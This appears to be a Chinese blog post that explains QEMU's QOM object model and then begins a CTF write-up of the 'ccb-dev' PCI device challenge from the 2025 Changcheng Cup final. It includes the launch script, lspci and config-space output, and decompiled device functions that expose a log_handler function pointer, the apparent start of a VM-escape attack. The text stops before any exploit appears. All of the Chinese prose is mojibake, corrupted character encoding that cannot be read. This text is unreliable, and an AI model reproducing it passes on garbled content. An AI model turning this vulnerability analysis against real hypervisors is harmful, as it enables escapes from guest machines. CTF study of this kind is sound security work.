ä¹æ‰€æœ‰çš„è®¾å¤‡å¦‚CPUã€å†…å­˜ã€æ€»çº¿ç­‰éƒ½æ˜¯åˆ©ç”¨è¿™ä¸€é¢å‘å¯¹è±¡çš„æ¨¡å‹æ¥å®ç°çš„ã€‚</p><p>ç”±äº<code>qemu</code>æ¨¡æ‹Ÿè®¾å¤‡ä»¥åŠCPUç­‰ï¼Œæ—¢æœ‰ç›¸åº”çš„å…±æ€§åˆæœ‰è‡ªå·±çš„ç‰¹æ€§ï¼Œå› æ­¤ä½¿ç”¨é¢å‘å¯¹è±¡æ¥å®ç°ç›¸åº”çš„ç¨‹åºæ˜¯éå¸¸é«˜æ•ˆçš„ï¼Œå¯ä»¥åƒç†è§£<code>C++</code>æˆ–å…¶å®ƒé¢å‘å¯¹è±¡è¯­è¨€æ¥ç†è§£<code>QOM</code>ã€‚</p><p>æœ‰å‡ ä¸ªæ¯”è¾ƒå…³é”®çš„ç»“æ„ä½“ï¼Œ<code>TypeInfo</code>ã€<code>TypeImpl</code>ã€<code>ObjectClass</code>ä»¥åŠ<code>Object</code>ã€‚å…¶ä¸­<code>ObjectClass</code>ã€<code>Object</code>ã€<code>TypeInfo</code>å®šä¹‰åœ¨<code>include/qom/object.h</code>ä¸­ï¼Œ<code>TypeImpl</code>å®šä¹‰åœ¨<code>qom/object.cä¸­</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeInfo</span> &#123;</span><br><span class="line">    <span class="comment">/* ç±»å‹æ ‡è¯† */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;          <span class="comment">// ç±»å‹åç§°ï¼ˆå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¦‚ &quot;MyDevice&quot;ï¼‰</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *parent;        <span class="comment">// çˆ¶ç±»å‹åç§°ï¼ˆç»§æ‰¿å…³ç³»ï¼ŒNULLè¡¨ç¤ºæ— çˆ¶ç±»ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* å®ä¾‹ï¼ˆå¯¹è±¡ï¼‰ç›¸å…³ */</span></span><br><span class="line">    <span class="type">size_t</span> instance_size;      <span class="comment">// å®ä¾‹çš„å†…å­˜å¤§å°ï¼ˆsizeof(MyObject)ï¼‰</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_init)(Object *obj);        <span class="comment">// å®ä¾‹æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–æˆå‘˜å˜é‡ï¼‰</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_post_init)(Object *obj);   <span class="comment">// å®ä¾‹åç½®åˆå§‹åŒ–ï¼ˆä¾èµ–æ³¨å…¥ç­‰ï¼‰</span></span><br><span class="line">    <span class="built_in">void</span> (*instance_finalize)(Object *obj);    <span class="comment">// å®ä¾‹ææ„å‡½æ•°ï¼ˆèµ„æºé‡Šæ”¾ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ç±»ï¼ˆå…ƒç±»å‹ï¼‰ç›¸å…³ */</span></span><br><span class="line">    <span class="type">bool</span> abstract;             <span class="comment">// æ˜¯å¦ä¸ºæŠ½è±¡ç±»å‹ï¼ˆä¸å¯ç›´æ¥å®ä¾‹åŒ–ï¼‰</span></span><br><span class="line">    <span class="type">size_t</span> class_size;         <span class="comment">// ç±»ç»“æ„ä½“å¤§å°ï¼ˆsizeof(MyClass)ï¼‰</span></span><br><span class="line">    <span class="built_in">void</span> (*class_init)(ObjectClass *klass, <span class="type">void</span> *data);      <span class="comment">// ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–é™æ€æ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="built_in">void</span> (*class_base_init)(ObjectClass *klass, <span class="type">void</span> *data); <span class="comment">// çˆ¶ç±»åˆå§‹åŒ–å›è°ƒ</span></span><br><span class="line">    <span class="built_in">void</span> (*class_finalize)(ObjectClass *klass, <span class="type">void</span> *data);   <span class="comment">// ç±»ææ„å‡½æ•°ï¼ˆæ¸…ç†é™æ€èµ„æºï¼‰</span></span><br><span class="line">    <span class="type">void</span> *class_data;          <span class="comment">// ç±»çº§åˆ«çš„è‡ªå®šä¹‰æ•°æ®ï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* æ¥å£æ”¯æŒï¼ˆå¤šç»§æ‰¿ï¼‰ */</span></span><br><span class="line">    InterfaceInfo *interfaces; <span class="comment">// å®ç°çš„æ¥å£åˆ—è¡¨ï¼ˆå¦‚ [Serializable, Drawable]ï¼‰</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>çš„å±æ€§ä¸<code>TypeInfo</code>çš„å±æ€§å¯¹åº”ï¼Œå®é™…ä¸Š<code>qemu</code>å°±æ˜¯é€šè¿‡ç”¨æˆ·æä¾›çš„<code>TypeInfo</code>åˆ›å»ºçš„<code>TypeImpl</code>çš„å¯¹è±¡ã€‚</p><p>å¦‚ä¸‹é¢å®šä¹‰çš„<code>pci_test_dev</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">    .name          = TYPE_PCI_TEST_DEV,       <span class="comment">// ç±»å‹åç§°ï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰</span></span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,         <span class="comment">// çˆ¶ç±»å‹ï¼ˆç»§æ‰¿è‡ªPCIè®¾å¤‡ï¼‰</span></span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(PCITestDevState), <span class="comment">// å®ä¾‹å†…å­˜å¤§å°</span></span><br><span class="line">    .class_init    = pci_testdev_class_init,  <span class="comment">// ç±»åˆå§‹åŒ–å‡½æ•°</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register</span>(info);  <span class="comment">// ç›´æ¥è°ƒç”¨åŠ¨æ€æ³¨å†Œå‡½æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(info-&gt;parent);  <span class="comment">// å¿…é¡»æŒ‡å®šçˆ¶ç±»å‹ï¼ˆå¼ºåˆ¶å•ç»§æ‰¿ï¼‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">type_register_internal</span>(info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="type">const</span> TypeInfo *info)</span> </span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = <span class="built_in">type_new</span>(info);      <span class="comment">// åˆ›å»ºç±»å‹å¯¹è±¡ï¼ˆTypeImplï¼‰</span></span><br><span class="line">    <span class="built_in">type_table_add</span>(ti);       <span class="comment">// å°†ç±»å‹æ·»åŠ åˆ°å…¨å±€ç±»å‹è¡¨</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ‰€æœ‰<code>qemu</code>æ€»çº¿ã€è®¾å¤‡ç­‰çš„<code>type_register_static</code>æ‰§è¡Œå®Œæˆåï¼Œå³å®ƒä»¬çš„<code>TypeImpl</code>å®ä¾‹åˆ›å»ºæˆåŠŸåï¼Œqemuå°±ä¼šåœ¨<code>type_initialize</code>å‡½æ•°ä¸­å»å®ä¾‹åŒ–å…¶å¯¹åº”çš„<code>ObjectClasses</code>ã€‚</p><p>æ¯ä¸ª<code>type</code>éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„<code>ObjectClass</code>æ‰€å¯¹åº”ï¼Œå…¶ä¸­<code>ObjectClass</code>æ˜¯æ‰€æœ‰ç±»çš„åŸºç±»</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span>  <span class="comment">// è¡¨ç¤ºä»¥ä¸‹å­—æ®µä¸ºå†…éƒ¨å®ç°ç»†èŠ‚ï¼Œå¤–éƒ¨ä¸åº”ç›´æ¥è®¿é—®</span></span><br><span class="line">    Type type;                  <span class="comment">// æŒ‡å‘è¯¥ç±»çš„TypeImplå¯¹è±¡ï¼ŒåŒ…å«ç±»å‹åç§°ã€çˆ¶ç±»ã€å®ä¾‹å¤§å°ç­‰å…ƒä¿¡æ¯</span></span><br><span class="line">    GSList *interfaces;         <span class="comment">// è¯¥ç±»å®ç°çš„æ‰€æœ‰æ¥å£ï¼ˆGSListé“¾è¡¨ç»“æ„ï¼Œæ”¯æŒå¤šæ¥å£ç»§æ‰¿ï¼‰</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];  <span class="comment">// ç¼“å­˜å¯¹è±¡ç±»å‹è½¬æ¢ç»“æœï¼ˆå¦‚object_dynamic_castï¼‰</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];   <span class="comment">// ç¼“å­˜ç±»ç±»å‹è½¬æ¢ç»“æœï¼ˆå¦‚class_dynamic_castï¼‰</span></span><br><span class="line">    </span><br><span class="line">    ObjectUnparent *unparent;   <span class="comment">// å½“å¯¹è±¡ä»çˆ¶å¯¹è±¡ä¸­ç§»é™¤æ—¶è°ƒç”¨çš„å›è°ƒå‡½æ•°</span></span><br><span class="line">    GHashTable *properties;     <span class="comment">// ç±»çš„é™æ€å±æ€§è¡¨ï¼ˆå­˜å‚¨é€šè¿‡class_property_add()æ·»åŠ çš„å±æ€§å®šä¹‰ï¼‰</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>type</code>æ˜¯è¿æ¥<code>ObjectClass</code>å’Œ<code>TypeImpl</code>å¯¹è±¡çš„æ¡¥æ¢</p><p>ç”¨æˆ·å¯ä»¥å®šä¹‰è‡ªå·±çš„ç±»ï¼Œç»§æ‰¿ç›¸åº”ç±»å³å¯ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TypeImpl</span> *Type;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ObjectClass</span> ObjectClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ObjectClass</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">DeviceClass</span> &#123;</span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PCIDeviceClass</span> &#123;</span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç±»çš„å®šä¹‰ä¸­<strong>çˆ¶ç±»éƒ½åœ¨ç¬¬ä¸€ä¸ªå­—æ®µ</strong>ï¼Œä½¿å¾—å¯ä»¥çˆ¶ç±»ä¸å­ç±»<strong>ç›´æ¥å®ç°è½¬æ¢</strong>ã€‚ä¸€ä¸ªç±»åˆå§‹åŒ–æ—¶ä¼šå…ˆåˆå§‹åŒ–å®ƒçš„çˆ¶ç±»ï¼Œçˆ¶ç±»åˆå§‹åŒ–å®Œæˆåï¼Œä¼šå°†ç›¸åº”çš„å­—æ®µæ‹·è´è‡³å­ç±»åŒæ—¶å°†å­ç±»å…¶ä½™å­—æ®µèµ‹å€¼ä¸º0ï¼Œå†è¿›ä¸€æ­¥èµ‹å€¼ã€‚åŒæ—¶ä¹Ÿä¼š<strong>ç»§æ‰¿çˆ¶ç±»ç›¸åº”çš„è™šå‡½æ•°æŒ‡é’ˆ</strong>ï¼Œå½“æ‰€æœ‰çš„çˆ¶ç±»éƒ½<strong>åˆå§‹åŒ–ç»“æŸå</strong>ï¼Œ<code>TypeInfo::class_init</code>å°±ä¼š<strong>è°ƒç”¨</strong>ä»¥å®ç°è™šå‡½æ•°çš„åˆå§‹åŒ–ï¼Œå¦‚ä¸‹ä¾‹çš„pci_testdev_class_initæ‰€ç¤ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = <span class="built_in">DEVICE_CLASS</span>(klass);</span><br><span class="line">        PCIDeviceClass *k = <span class="built_in">PCI_DEVICE_CLASS</span>(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;exit = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h2 id="2025é•¿åŸæ¯å†³èµ›-ccb-dev"><a href="#2025é•¿åŸæ¯å†³èµ›-ccb-dev" class="headerlink" title="2025é•¿åŸæ¯å†³èµ›  ccb-dev"></a>2025é•¿åŸæ¯å†³èµ›  ccb-dev</h2><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">97b</span>480f126b2:/home/ctf<span class="meta"># cat run.sh \n</span></span><br><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m <span class="number">512</span>M \</span><br><span class="line">    -kernel ./vmlinuz \</span><br><span class="line">    -initrd  ./core.cpio \</span><br><span class="line">    -L pc-bios \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet kaslr&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -smp cores=<span class="number">2</span>,threads=<span class="number">1</span> \</span><br><span class="line">    -device ccb-dev-pci \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°qemuçš„å¯åŠ¨è„šæœ¬ï¼Œæœ‰ä¸ª<code>-device ccb-dev-pci</code>ï¼šåŠ è½½ä¸€ä¸ª <strong>è‡ªå®šä¹‰ PCI è®¾å¤‡</strong></p><p>å¯ä»¥çŒœæµ‹æ¼æ´å°±åœ¨è¿™ä¸ªpciä¸Šï¼Œçœ‹pciçš„è¯¦ç»†ä¿¡æ¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># lspci -v</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.0</span> Class <span class="number">0601</span>: <span class="number">8086</span>:<span class="number">7000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">04.0</span> Class <span class="number">00f</span>f: <span class="number">1234</span>:<span class="number">1337</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00.0</span> Class <span class="number">0600</span>: <span class="number">8086</span>:<span class="number">1237</span></span><br><span class="line"><span class="number">00</span>:<span class="number">01.3</span> Class <span class="number">0680</span>: <span class="number">8086</span>:<span class="number">7113</span></span><br><span class="line"><span class="number">00</span>:<span class="number">03.0</span> Class <span class="number">0200</span>: <span class="number">8086</span>:<span class="number">100</span>e</span><br><span class="line"><span class="number">00</span>:<span class="number">01.1</span> Class <span class="number">0101</span>: <span class="number">8086</span>:<span class="number">7010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">02.0</span> Class <span class="number">0300</span>: <span class="number">1234</span>:<span class="number">1111</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªéæ ‡å‡†çš„å‚å•†å’Œè®¾å¤‡idï¼Œ1234:1337æ›´åƒæ˜¯ccb_devçš„pci</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/sys/devices/pci0000:<span class="number">00</span>/<span class="number">0000</span>:<span class="number">00</span>:<span class="number">04.0</span> <span class="meta"># hexdump config</span></span><br><span class="line"><span class="number">0000000</span> <span class="number">1234</span> <span class="number">1337</span> <span class="number">0103</span> <span class="number">0000</span> <span class="number">0081</span> <span class="number">00f</span>f <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000010</span> <span class="number">1000</span> febf <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line"><span class="number">0000020</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">1</span>af4 <span class="number">1100</span></span><br><span class="line"><span class="number">0000030</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span> <span class="number">0000</span></span><br><span class="line">*</span><br><span class="line"><span class="number">0000100</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªBAR0æ˜¯MMIO</p><p>é€†å‘<code>qemu</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  DeviceClass *dc; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  PCIDeviceClass *pci; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dc = (DeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                        oc,</span><br><span class="line">                        <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                        <span class="number">146</span>,</span><br><span class="line">                        <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci = (PCIDeviceClass *)<span class="built_in">object_class_dynamic_cast_assert</span>(</span><br><span class="line">                            oc,</span><br><span class="line">                            <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                            <span class="number">147</span>,</span><br><span class="line">                            <span class="string">&quot;ccb_dev_class_init&quot;</span>);</span><br><span class="line">  pci-&gt;realize = (<span class="built_in">void</span> (*)(PCIDevice *, Error **))ccb_dev_realize;</span><br><span class="line">  pci-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  pci-&gt;device_id = <span class="number">4919</span>;</span><br><span class="line">  pci-&gt;revision = <span class="number">-127</span>;</span><br><span class="line">  pci-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  dc-&gt;desc = <span class="string">&quot;arttnba3 test PCI device&quot;</span>;</span><br><span class="line">  <span class="built_in">set_bit_68</span>(<span class="number">7LL</span>, dc-&gt;categories);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„ä½œç”¨ï¼š</p><ul><li>ç¡®ä¿å½“å‰è®¾å¤‡ç±»ç»§æ‰¿è‡ª QEMU çš„é€šç”¨è®¾å¤‡åŸºç±» å’Œ ç¡®ä¿å½“å‰è®¾å¤‡ç±»æ˜¯ä¸€ä¸ª PCI è®¾å¤‡ã€‚</li><li><code>realize</code> æ˜¯ QEMU è®¾å¤‡åˆå§‹åŒ–çš„å…³é”®å›è°ƒï¼Œåœ¨è®¾å¤‡å®ä¾‹åŒ–æ—¶è¢«è°ƒç”¨</li><li>é…ç½® PCI è®¾å¤‡çš„å‚å•† IDã€è®¾å¤‡ IDã€ç‰ˆæœ¬å·å’Œç±»ä»£ç ã€‚</li><li>ç„¶å è®¾ç½®è®¾å¤‡çš„æè¿°å­—ç¬¦ä¸²ã€‚</li><li>æœ€åè®¾ç½® ç±»åˆ«æ©ç  å¯¹ è®¾å¤‡è¿›è¡Œåˆ†ç±»ï¼Œæ©ç ä¸º7</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">ccb_dev_realize</span><span class="params">(PCIDevice *pci_dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CCBPCIDevState *ds_0; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  ds_0 = (CCBPCIDevState *)<span class="built_in">object_dynamic_cast_assert</span>(</span><br><span class="line">                             &amp;pci_dev-&gt;qdev.parent_obj,</span><br><span class="line">                             <span class="string">&quot;ccb-dev-pci&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/worksapce/qemu-3.1.0/hw/misc/ccb-dev.c&quot;</span>,</span><br><span class="line">                             <span class="number">123</span>,</span><br><span class="line">                             <span class="string">&quot;ccb_dev_realize&quot;</span>);</span><br><span class="line">  <span class="built_in">memory_region_init_io</span>(</span><br><span class="line">    &amp;ds_0-&gt;mmio,</span><br><span class="line">    &amp;ds_0-&gt;parent_obj.qdev.parent_obj,</span><br><span class="line">    &amp;ccb_dev_mmio_ops,</span><br><span class="line">    pci_dev,</span><br><span class="line">    <span class="string">&quot;ccb_dev-mmio&quot;</span>,</span><br><span class="line">    <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">pci_register_bar</span>(pci_dev, <span class="number">0</span>, <span class="number">0</span>, &amp;ds_0-&gt;mmio);</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;buffer, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;buffer));</span><br><span class="line">  ds_0-&gt;index = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_arg = <span class="number">0LL</span>;</span><br><span class="line">  ds_0-&gt;status = <span class="number">0</span>;</span><br><span class="line">  ds_0-&gt;log_fd = <span class="number">2LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(ds_0-&gt;log_format, <span class="number">0</span>, <span class="built_in">sizeof</span>(ds_0-&gt;log_format));</span><br><span class="line">  ds_0-&gt;log_handler = (LogHandlerFunc)&amp;dprintf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>MMIO åˆå§‹åŒ–</strong>ï¼š  <ul><li>è®¾å¤‡é€šè¿‡ <code>MMIO</code> ä¸ <code>Guest</code> äº¤äº’ï¼Œå¤§å°ä¸º <code>2KB</code>ï¼Œæ“ä½œç”± <code>ccb_dev_mmio_ops</code> å®ç°ã€‚</li><li>éœ€ç¡®ä¿ <code>ccb_dev_mmio_ops</code> å·²å®šä¹‰ï¼ˆå¦‚ <code>read/write</code> å›è°ƒï¼‰ã€‚</li></ul></li><li><strong>PCI BAR æ³¨å†Œ</strong>ï¼š  <ul><li><code>Guest</code> è®¿é—® <code>PCI BAR 0</code> æ—¶ï¼Œä¼šæ˜ å°„åˆ°è®¾å¤‡çš„ <code>MMIO</code> åŒºåŸŸã€‚</li></ul></li><li><strong>è®¾å¤‡çŠ¶æ€åˆå§‹åŒ–</strong>ï¼š  <ul><li>ç¼“å†²åŒºã€æ—¥å¿—ã€çŠ¶æ€å¯„å­˜å™¨ç­‰å‡è¢«æ¸…é›¶æˆ–è®¾ä¸ºé»˜è®¤å€¼ã€‚</li></ul></li><li><strong>æ—¥å¿—æœºåˆ¶</strong>ï¼š  <ul><li>é»˜è®¤æ—¥å¿—è¾“å‡ºåˆ° <code>stderr</code>ï¼Œå¯é€šè¿‡ä¿®æ”¹ <code>log_fd</code> å’Œ <code>log_handler</code> é‡å®šå‘ã€‚</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 